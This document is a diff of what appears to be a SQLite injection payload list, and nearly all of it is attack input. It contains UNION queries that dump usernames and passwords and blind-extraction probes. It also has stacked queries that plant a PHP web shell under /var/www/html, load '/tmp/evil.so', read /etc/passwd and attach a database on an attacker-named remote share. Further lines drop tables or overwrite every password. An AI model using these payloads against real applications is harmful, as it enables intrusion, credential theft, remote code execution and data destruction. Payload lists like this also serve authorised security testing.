@@ -1,38 +1,55 @@
-'
-"
-')
-")
-' --
-" --
-' OR '1'='1
-'||'
-
--- comment
-/*comment*/
-
-' UNION SELECT sqlite_version(),NULL--
-' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--
-
-' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--
-' UNION SELECT tbl_name,NULL FROM sqlite_master--
-
-' UNION SELECT sql,NULL FROM sqlite_master WHERE name='users'--
-
-' UNION SELECT username,NULL FROM users--
-' UNION SELECT username||':'||password,NULL FROM users--
-
-' AND SUBSTR(username,1,1)='a'--
-' AND LENGTH(password)=32--
+' AND RANDOMBLOB(1000000000)-- (heavy computation instead of sleep)
+1 AND 1=1--
+1 AND 1=2--
+' AND 1=1--
+' AND 1=2--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,sqlite_version(),3--
+' UNION SELECT 1,2,sqlite_version()--
+' UNION SELECT 1,2,3,sqlite_version()--
+' UNION SELECT 1,group_concat(name),3 FROM sqlite_master WHERE type='table'--
+' UNION SELECT 1,group_concat(sql),3 FROM sqlite_master WHERE type='table'--
+' UNION SELECT 1,group_concat(name),3 FROM sqlite_master WHERE type='index'--
+' UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'--
+' UNION SELECT 1,sql,3 FROM sqlite_master WHERE name='users'--
+' UNION SELECT 1,group_concat(username||':'||password),3 FROM users--
+' UNION SELECT 1,username,3 FROM users LIMIT 0,1--
+' UNION SELECT 1,username,3 FROM users LIMIT 1,1--
+' UNION SELECT 1,username,3 FROM users LIMIT 2,1--
+' UNION SELECT 1,password,3 FROM users WHERE username='admin'--
+' AND (SELECT SUBSTR(username,1,1) FROM users WHERE username='admin')='a'--
+' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=32--
 ' AND (SELECT COUNT(*) FROM users)>0--
-
-' AND 1=1 AND (SELECT COUNT(*) FROM sqlite_master,sqlite_master,sqlite_master,sqlite_master)>0--
-
-' UNION SELECT load_extension('/tmp/evil.so'),NULL--
-'; SELECT load_extension('/tmp/evil.so')--
-
-'; ATTACH DATABASE '/var/www/html/shell.php' AS lol--
-'; CREATE TABLE lol.pwn (dataz text)--
-'; INSERT INTO lol.pwn VALUES ('<?php system($_GET["c"]); ?>')--
-
-'||user()||'
-'||hex(username)||'
+' AND (SELECT typeof(username) FROM users)='text'--
+' UNION SELECT 1,hex(password),3 FROM users--
+' UNION SELECT 1,quote(password),3 FROM users--
+' UNION SELECT 1,CAST(password AS TEXT),3 FROM users--
+'; ATTACH DATABASE '/var/www/html/shell.php' AS shell--
+'; CREATE TABLE shell.exploit (payload TEXT)--
+'; INSERT INTO shell.exploit(payload) VALUES ('<?php system($_GET[cmd]); ?>')--
+'; ATTACH DATABASE '\\attacker.com\share\db.sqlite' AS remote--
+'; SELECT load_extension('/tmp/evil.so','exploit')--
+'; SELECT writefile('/var/www/html/shell.php','<?php system($_GET[cmd]); ?>')--
+'; SELECT readfile('/etc/passwd')--
+SELECT CASE WHEN (1=1) THEN RANDOMBLOB(1000000000) ELSE 0 END
+SELECT CASE WHEN (1=2) THEN RANDOMBLOB(1000000000) ELSE 0 END
+SELECT CASE WHEN (SELECT SUBSTR(username,1,1) FROM users LIMIT 1)='a' THEN RANDOMBLOB(1000000000) ELSE 0 END
+1; DROP TABLE users--
+1; DROP TABLE IF EXISTS users--
+1; DELETE FROM users WHERE 1=1--
+1; UPDATE users SET password='hacked' WHERE 1=1--
+1; INSERT INTO users VALUES ('hacker','hacked','admin')--
+' GLOB 'a*'--
+' GLOB 'A*'--
+' LIKE 'a%'--
+' LIKE 'A%'--
+'; PRAGMA user_version--
+'; PRAGMA table_info(users)--
+'; PRAGMA database_list--
+'; PRAGMA integrity_check--
+'; PRAGMA foreign_key_list(users)--
+'; PRAGMA index_list(users)--
+'; PRAGMA freelist_count--
+'; PRAGMA page_count--
+'; PRAGMA journal_mode--
+'; PRAGMA wal_autocheckpoint--
